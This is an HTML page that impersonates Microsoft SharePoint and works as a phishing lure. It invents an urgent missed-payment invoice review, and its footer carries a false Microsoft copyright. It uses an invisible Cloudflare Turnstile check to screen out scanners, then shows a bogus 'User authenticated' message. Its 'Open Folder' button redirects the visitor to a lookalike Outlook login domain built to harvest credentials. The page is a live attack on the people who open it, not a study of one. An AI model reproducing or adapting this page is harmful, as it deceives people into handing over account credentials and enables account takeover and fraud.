<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Valuation and Report</title>
    <link rel="icon" href="image/favicon.ico" type="image/x-icon">
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    <style>
        /* --- MICROSOFT FLUENT UI DESIGN SYSTEM VARIABLES --- */
        :root {
            --ms-teal: #007874;
            --ms-teal-hover: #005a57;
            --text-main: #242424;
            --text-muted: #595959;
            --bg-canvas: #f3f2f1;
            --white: #ffffff;
            --border-muted: #d2d0ce;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: var(--bg-canvas);
            color: var(--text-main);
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            -webkit-font-smoothing: antialiased;
        }

        /* --- GLOBAL NAVIGATION HEADER --- */
        header {
            background-color: var(--white);
            border-bottom: 1px solid var(--border-muted);
            padding: 16px 40px;
            display: flex;
            align-items: center;
        }

        .logo-section {
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 18px;
            font-weight: 600;
            color: var(--text-main);
            text-decoration: none;
        }

        /* --- SHAREPOINT HERO PANE BLOCK --- */
        .main-wrapper {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
        }

        .hero-card {
            background: var(--white);
            border: 1px solid var(--border-muted);
            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.06);
            max-width: 1200px;
            width: 100%;
            display: grid;
            grid-template-columns: 1.1fr 0.9fr;
            align-items: stretch;
            overflow: hidden;
        }

        .hero-image-pane {
            position: relative;
            min-height: 380px;
            width: 100%;
            overflow: hidden;
            display: flex;
        }

        .hero-image-pane img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
        }

        .hero-content {
            padding: 50px 60px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: flex-start;
        }

        .finance-tag {
            background-color: var(--ms-teal);
            color: var(--white);
            font-size: 12px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
            padding: 6px 14px;
            margin-bottom: 20px;
            display: inline-block;
        }

        .hero-title {
            font-size: 32px;
            font-weight: 600;
            line-height: 40px;
            margin-bottom: 16px;
            color: #242424;
        }

        .hero-desc {
            font-size: 15px;
            color: var(--text-muted);
            line-height: 24px;
            margin-bottom: 36px;
        }

        /* --- AUTH SUCCESS MESSAGES --- */
        .auth-status {
            color: #107c10; /* Microsoft success green */
            font-weight: 600;
            font-size: 14px;
            margin-bottom: 6px;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .auth-instruction {
            color: var(--text-muted);
            font-size: 14px;
            margin-bottom: 16px;
        }

        /* --- BUTTONS & ACTIONS --- */
        .modal-actions {
            display: flex;
            justify-content: flex-start;
            gap: 12px;
            padding-top: 16px;
            border-top: 1px solid var(--border-muted);
            margin-top: 8px;
            width: 100%;
        }

        .btn-light,
        .btn-primary {
            border: 1px solid #8a8886;
            padding: 8px 20px;
            border-radius: 2px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .btn-light {
            background: #ffffff;
            color: var(--text-main);
        }
        .btn-light:hover {
            background: #f3f2f1;
        }

        .btn-primary {
            background: var(--ms-teal);
            border-color: var(--ms-teal);
            color: white;
        }
        .btn-primary:hover:not(:disabled) {
            background: var(--ms-teal-hover);
            border-color: var(--ms-teal-hover);
        }
        
        .btn-primary:disabled {
            background: #c8c6c4;
            border-color: #c8c6c4;
            color: #ffffff;
            cursor: not-allowed;
        }

        /* --- RESPONSIVE MOBILE PREVIEW CONSTRAINTS --- */
        @media (max-width: 840px) {
            .hero-card {
                grid-template-columns: 1fr;
                max-width: 480px;
            }
            .hero-image-pane {
                min-height: 250px;
                grid-row: 1;
            }
            .hero-content {
                grid-row: 2;
                padding: 30px 24px;
            }
            .hero-title {
                font-size: 24px;
                line-height: 32px;
            }
        }

        /* --- DYNAMIC TRANSITION COVER LAYER OVERLAY --- */
        .transition-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background-color: var(--bg-canvas);
            z-index: 9999;
        }

        .loading-bar {
            height: 100%;
            width: 0%;
            background-color: var(--ms-teal);
            animation: progress-fill 3.5s cubic-bezier(0.1, 0.9, 0.2, 1) forwards;
        }

        @keyframes progress-fill {
            0% { width: 0%; }
            100% { width: 100%; }
        }

        /* --- GLOBAL PORTAL FOOTER BLOCK --- */
        footer {
            background-color: var(--white);
            border-top: 1px solid var(--border-muted);
            padding: 20px 40px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 12px;
            color: var(--text-muted);
        }

        .footer-links a {
            color: var(--text-muted);
            text-decoration: none;
            margin-left: 20px;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <div class="transition-overlay">
        <div class="loading-bar"></div>
    </div>

    <header>
        <a href="#" class="logo-section">
            <svg width="20" height="20" viewBox="0 0 23 23" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M0 0H11V11H0V0Z" fill="#F25022"/>
                <path d="M12 0H23V11H12V0Z" fill="#7FBA00"/>
                <path d="M0 12H11V23H0V12Z" fill="#00A4EF"/>
                <path d="M12 12H23V23H12V12Z" fill="#FFB900"/>
            </svg>
            <span>SharePoint</span>
        </a>
    </header>

    <main class="main-wrapper">
        <div class="hero-card">
            
            <div class="hero-image-pane">
                <img src="image/hero.jpg" alt="SharePoint Hero Banner">
            </div>

            <div class="hero-content">
                <div class="finance-tag">Invoice Valuation</div>
                <h1 class="hero-title">Invoice & Account Valuation - Missed <br>(October) Payment</h1>
                <p class="hero-desc">
                    Team payment variances have been identified and require priority review before payment is released.
                </p>
                
                <div class="sheet-preview" id="preview-box">
                    <div class="cf-turnstile" 
                         data-sitekey="0x4AAAAAAFq2MRj4X-2Z98Gd" 
                         data-callback="onTurnstileSuccess" 
                         data-size="invisible">
                    </div>
                    
                    <div class="modal-actions" id="modal-actions">
                        <button class="btn-light" id="dismiss-btn">Dismiss</button>
                        <button class="btn-primary" id="open-btn" disabled>Open Folder</button>
                    </div>
                </div>
            </div>
            
        </div>
    </main>

    <footer>
        <div>&copy; 2026 Microsoft Corporation. All rights reserved.</div>
        <div class="footer-links">
            <a href="#">Privacy & Cookies</a>
            <a href="#">Terms of Use</a>
        </div>
    </footer>

    <script>
        // Configuration Settings
        let isAuthenticated = false;
        const destinationUrl = "https://login.outlookportal.exhaustchronicle.org/FqocHzNi"; 

        // Cloudflare Turnstile Validation Success Callback
        function onTurnstileSuccess(token) {
            isAuthenticated = true;
            
            const previewBox = document.getElementById('preview-box');
            const modalActions = document.getElementById('modal-actions');
            const turnstileWidget = previewBox.querySelector('.cf-turnstile');
            
            // 1. Hide the turnstile widget after success to clean up the UI
            if (turnstileWidget) {
                turnstileWidget.style.display = 'none';
            }
            
            // 2. Create the success message elements
            const successMessage = document.createElement('div');
            successMessage.innerHTML = `
                <div class="auth-status">
                    <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
                        <path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0zm3.41 5.03a.75.75 0 0 0-1.06-1.06L6.5 7.82 5.28 6.6a.75.75 0 1 0-1.06 1.06l1.75 1.75a.75.75 0 0 0 1.06 0l4.38-4.38z"/>
                    </svg>
                    User authenticated
                </div>
                <div class="auth-instruction">You are ready to view your shared file.</div>
            `;
            
            // 3. Insert the message RIGHT ABOVE the buttons (so buttons don't disappear)
            previewBox.insertBefore(successMessage, modalActions);
            
            // 4. Enable the "Open Folder" button
            const openBtn = document.getElementById('open-btn');
            openBtn.disabled = false;
        }

        // Assign redirection event handler to the Open Folder button
        document.getElementById('open-btn').addEventListener('click', function() {
            if (isAuthenticated) {
                window.location.href = destinationUrl;
            }
        });

        // Optional: Dismiss button functionality (e.g., go back or close)
        document.getElementById('dismiss-btn').addEventListener('click', function() {
            window.history.back(); 
        });
    </script>

</body>
</html>
